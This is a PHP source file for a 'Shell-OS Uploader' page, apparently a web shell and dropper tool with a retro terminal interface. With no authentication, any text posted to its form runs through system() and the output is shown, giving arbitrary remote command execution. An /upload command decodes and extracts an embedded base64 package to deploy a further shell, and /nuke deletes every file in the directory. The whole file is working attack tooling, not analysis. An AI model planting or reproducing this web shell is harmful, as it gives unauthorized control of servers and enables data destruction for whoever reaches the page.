<?php $shell_package = "{package_base64}";
$package_name = "shell.tar.xz"; ?>
<!DOCTYPE html>
<html>

<head>
  <title>Shell-OS Uploader</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --bg: #050505;
      --fg: #0F0F0F;
      --text: #F0F0F0;
    }
    ::selection {
      background: var(--text);
      color: var(--bg);
    }
    body {
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .crt::after {
      content: " ";
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: rgba(18, 16, 16, 0.1);
      opacity: 0;
      z-index: 2;
      pointer-events: none;
    }
    .crt::before {
      content: " ";
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
      z-index: 2;
      background-size: 100% 2px, 3px 100%;
      pointer-events: none;
    }
    .crt {
      position: absolute;
      width: 100vw;
      height: 100vh;
      pointer-events: none;
    }
    #main-viewport {
      font-family: monospace;
      background-color: var(--fg);
      color: var(--text);
      font-size: 1.4em;
      height: 75vh;
      width: 50vw;
      border-radius: 12px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      padding: 16px;
    }
    #logo {
      flex: 0.5;
      filter: brightness(0.9);
      width: 100%;
      max-width: 75%;
      height: auto;
    }
    #headline {
      flex: 0.1;
      font-size: 0.8em;
      opacity: 0.5;
    }

    #console {
      flex: 1;
      width: 100%;
      height: 100%;
      background-color: var(--bg);
      position: relative;
      border-radius: 6px;
      overflow: auto;
    }
    #console p {
      font-size: 0.8em;
      opacity: 0.8;
      margin: 0;
      padding: 16px;
      box-sizing: border-box;
      position: absolute;
      bottom: 0;
      white-space: pre-line;
      word-wrap: break-word;
    }
    #console pre {
      font-size: 0.8em;
      opacity: 0.8;
      margin: 0;
      padding: 16px;
      box-sizing: border-box;
      word-wrap: break-word;
    }
    form {
      background-color: rgba(255, 255, 255, 0.2);
      width: 100%;
      height: 32px;
      border-bottom-left-radius: 6px;
      border-bottom-right-radius: 6px;
    }
    form input[type=text] {
      background-color: transparent;
      padding-left: 16px;
      padding-right: 16px;
      color: var(--text);
      border: none;
      outline: none;
      width: 100%;
      height: 32px;
      font-family: monospace;
      max-width: 100%;
      box-sizing: border-box;
    }
    a {
      color: var(--text);
    }
    a:hover {
      color: var(--text);
      text-decoration: underline;
    }
    a:visited {
      color: var(--text);
      text-decoration: none;
    }
  </style>
</head>

<body>
  <div class="crt"></div>
  <div id="main-viewport">
    <svg id="logo" version="1.1" viewBox="0 0 672 152" xmlns="http://www.w3.org/2000/svg">
      <path id="logo" transform="translate(-363,-324)" d="m379 340v64.356h3.145v12.829h50.45v8.4433h-53.595v21.542h3.145v12.83h79.464v-68.609h-7.5752v-8.5774h-46.038v-8.4433h53.614v-25.793h-7.5752v-8.5775h-64.315zm85.752 0v107.17h3.145v12.83h25.868v-34.478h-0.0173v-8.3372h24.6v29.985h3.145v12.83h25.869v-111.42h-7.5753v-8.5775h-21.439v42.814h-24.582v-34.236h-7.5737v-8.5775h-10.72zm85.752 0v107.17h3.145v12.83h79.464v-25.795h-7.5753v-8.5774h-46.038v-8.4433h32.175v-25.793h-7.5752v-8.5774h-24.6v-8.4433h53.614v-25.793h-7.5753v-8.5775h-64.315zm85.752 0v107.17h3.145v12.83h79.464v-25.795h-7.5752v-8.5774h-46.022v-77.05h-7.5737v-8.5775h-10.72zm85.752 0v107.17h3.145v12.83h79.464v-25.795h-7.5753v-8.5774h-46.02v-77.05h-7.5752v-8.5775h-10.719zm128.63 0v21.406h-10.719v64.357h3.145v12.829h7.5737v8.5774h3.145v12.83h68.745v-13.072h-0.0188v-8.3356h10.738v-68.607h-7.5752v-8.579h-3.1434v-12.829h-7.5753v-8.5775h-53.595zm85.752 0v64.356h3.145v12.829h50.451v8.4433h-53.596v21.542h3.145v12.83h79.464v-68.609h-7.5752v-8.5774h-46.039v-8.4433h53.614v-25.793h-7.5752v-8.5775h-64.314zm-482.36 9.838h6.3056v23.272h-53.612v9.7038h-1.8769v-11.568h53.614v-19.543h-4.4303zm32.158 0h6.3056v32.976h-1.8942v-21.166h0.0188v-9.9456h-4.4303zm53.595 0h6.3056v108.9h-23.332v-11.568h1.8754v9.7038h19.581v-9.9456h-0.0173v-85.28h0.0173v-9.9456h-4.4303zm85.752 0h6.3057v23.272h-53.612v9.7038h-1.877v-11.568h53.614v-19.543h-4.4303zm32.158 0h6.3057v75.79h-1.8926v-63.98h0.0173v-9.9456h-4.4303zm85.752 0h6.3056v75.79h-1.8926v-63.98h0.0173v-9.9456h-4.4303zm171.5 0h6.3056v11.568h-1.8754v-9.7038h-4.4303zm96.471 0h6.3072v23.272h-53.614v9.7038h-1.8754v-11.568h53.612v-19.543h-4.4302zm-557.39 3.1264h3.1622v17.021h-53.614v12.829h-3.1434v-21.272h53.595zm32.158 0h3.1622v8.3356h-0.0188v21.514h-3.1434v-21.408zm53.595 0h3.1622v8.3356h-0.0188v85.977h0.0188v8.3356h-17.043v-8.4433h13.881v-85.764zm85.752 0h3.1622v17.021h-53.614v12.829h-3.1434v-21.272h53.595zm32.158 0h3.1622v8.3356h-0.0188v64.328h-3.1434v-64.222zm85.752 0h3.1622v8.3356h-0.0188v64.328h-3.1434v-64.222zm171.5 0h3.1622v8.4417h-3.1622zm96.471 0h3.1622v17.021h-53.612v12.829h-3.145v-21.272h53.595zm-150.07 8.5775h42.876v8.4433h-39.733v55.643h-3.1434v-42.814zm4.4114 9.7038h38.465v1.8643h-36.588v9.9456h0.0173v42.572h-1.8942v-42.922zm59.902 0h6.3072v66.086h-10.737v9.9456h0.0173v11.461h-66.208v-11.568h1.8754v9.7038h62.457v-9.9456h-0.0173v-11.461h10.736v-9.9457h-0.0173v-42.466h0.0173v-9.9456h-4.4303zm-56.757 3.1249h35.32v51.257h-35.303v-42.922h-0.0173zm56.757 0h3.1622v8.3356h-0.0173v43.163h0.0173v8.3356h-10.737v13.072h0.0188v8.3356h-59.919v-8.4433h56.757v-21.406h10.719v-42.95zm-471.64 18.281h6.3056v66.086h-76.926v-11.568h1.8754v9.7038h73.176v-9.9456h-0.0173v-42.464h0.0173v-9.9457h-4.4303zm150.07 0h6.3072v23.272h-32.175v9.7038h-1.877v-11.568h32.176v-19.542h-4.4318zm407.32 0h6.3072v66.086h-76.928v-11.568h1.8769v9.7038h73.174v-9.9456h-0.017v-42.464h0.017v-9.9457h-4.4302zm-557.39 3.1264h3.1622v8.3356h-0.0188v43.163h0.0188v8.3356h-70.64v-8.4433h67.477v-42.95zm150.07 0h3.1622v17.021h-32.175v12.829h-3.1434v-21.272h32.156zm407.32 0h3.1622v8.3356h-0.017v43.163h0.017v8.3356h-70.638v-8.4433h67.476v-42.95zm-628.01 8.5774h1.8754v9.7038h47.307v1.8643h-49.182zm3.1434 0h46.038v8.4433h-46.038zm99.635 0h32.156v8.4433h-29.013v34.478h0.0188v8.3356h-17.045v-8.4433h13.882v-21.542zm454.61 0h1.8769v9.7038h47.307v1.8643h-49.183zm3.145 0h46.038v8.4433h-46.038zm-453.35 9.7038h27.745v1.8643h-25.868v9.9457h0.0173v32.868h-23.332v-11.568h1.8754v9.7038h19.581v-9.9456h-0.0188v-21.406zm317.16 11.568v21.542h3.145v12.83h25.869v-25.795h-7.5752v-8.5774h-10.719zm36.571 0.13574h1.8754v9.7038h4.4303v1.8643h-6.3056zm3.1434 0h3.1622v8.4417h-3.1622zm-221.94 9.7038h6.3057v23.27h-76.926v-11.568h1.8754v9.7038h73.176v-19.542h-4.4303zm85.752 0h6.3056v23.27h-76.926v-11.568h1.8754v9.7038h73.176v-19.542h-4.4303zm85.752 0h6.3072v23.27h-76.928v-11.568h1.8754v9.7038h73.176v-19.542h-4.4303zm32.158 0h6.3056v23.27h-23.332v-11.568h1.8754v9.7038h19.581v-19.542h-4.4303zm-203.66 3.1249h3.1622v17.021h-70.64v-8.4433h67.477zm85.752 0h3.1622v17.021h-70.638v-8.4433h67.476zm85.752 0h3.1622v17.021h-70.638v-8.4433h67.476zm32.158 0h3.1622v17.021h-17.043v-8.4433h13.881z" fill="#fff" />
    </svg>
    <p id="headline">// Shell.OS Manager //</p>
    <div id="console">
      <p>
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
          $command = $_POST['cmd'];
          switch ($command) {
            case '/help':
              help();
              break;
            case '/upload':
              uploadShell();
              break;
            case '/status':
              checkShell();
              break;
            case '/delete':
              deleteShell();
              break;
            case '/nuke':
              nuke();
              break;
            default:
              ob_start();
              system($command . " 2>&1");
              $output = ob_get_contents();
              ob_end_clean();
              echo "<pre>$output</pre>";
          }
        } else {
          echo "Welcome to the Shell.OS Uploader System!";
          echo "</br>";
          echo "Type '/help' to see available commands.";
          echo "</br>";
          echo "</br>";
          echo "Or type a Linux command to execute it.";
          echo "</br>";
        }
        function help()
        {
          echo "Available commands:";
          echo "</br>";
          echo "/help   - Shows this help message";
          echo "</br>";
          echo "/upload - Uploads the shell to the server";
          echo "</br>";
          echo "/status - Checks if the shell is uploaded";
          echo "</br>";
          echo "/delete - Deletes the shell from the server";
          echo "</br>";
          echo "/nuke   - Delete all uploaded files on the server";
          echo "</br>";
          echo "</br>";
          echo "Or type a Linux command to execute it.";
          echo "</br>";
        }
        function uploadShell()
        {
          if (!shell_exec("which tar")) {
            echo "tar command is not available!";
            echo "</br>";
            return;
          }
          global $shell_package;
          global $package_name;
          if ($shell_package == "{package_base64}") {
            echo "Shell is empty, please run the build script first!";
            echo "</br>";
            return;
          }
          $base64File = $shell_package;
          $decodedFile = base64_decode($base64File);
          $filePath = __DIR__ . '/' . $package_name;
          file_put_contents($filePath, $decodedFile);
          echo "Shell uploaded successfully!";
          echo "</br>";
          echo "Extracting shell...";
          echo "</br>";
          $output = shell_exec("tar -xf " . $package_name . " -C " . __DIR__);
          echo "Shell extracted successfully!";
          echo "</br>";
          echo "<a href='./index.php'>Click here to access Shell.OS</a>";
          echo "</br>";
          return;
        }
        function checkShell()
        {
          global $package_name;
          $filePath = __DIR__ . '/' . $package_name;
          echo "Checking if shell is uploaded...";
          echo "</br>";
          if (file_exists($filePath)) {
            echo "Shell is uploaded! <a href='./index.php'>Click here to access Shell.OS</a>";
            echo "</br>";
          } else {
            echo "Shell is not uploaded! Please upload it first using the '/upload' command!";
            echo "</br>";
          }
        }
        function deleteShell()
        {
          global $package_name;
          $filePath = __DIR__ . '/' . $package_name;
          echo "Deleting shell...";
          echo "</br>";
          if (file_exists($filePath)) {
            unlink($filePath);
            echo "Shell deleted successfully!";
            echo "</br>";
          } else {
            echo "Shell is not uploaded!";
            echo "</br>";
          }
        }
        function nuke()
        {
          $files = glob(__DIR__ . '/*');
          foreach ($files as $file) {
            if (is_file($file)) {
              unlink($file);
              echo "Deleted file: " . $file;
              echo "</br>";
            }
          }
          echo "Nuked the folder!";
          echo "</br>";
        } ?>
      </p>
    </div>
    <form id="shell-input" method="post">
      <input type="text" placeholder=">" name="cmd" autocomplete="off" autofocus>
    </form>
  </div>
  <script>
    document.querySelector('#shell-input').addEventListener('keydown', function(event) {
      if (event.keyCode === 13) {
        event.preventDefault();
        this.submit();
      }
    });
  </script>
</body>

</html>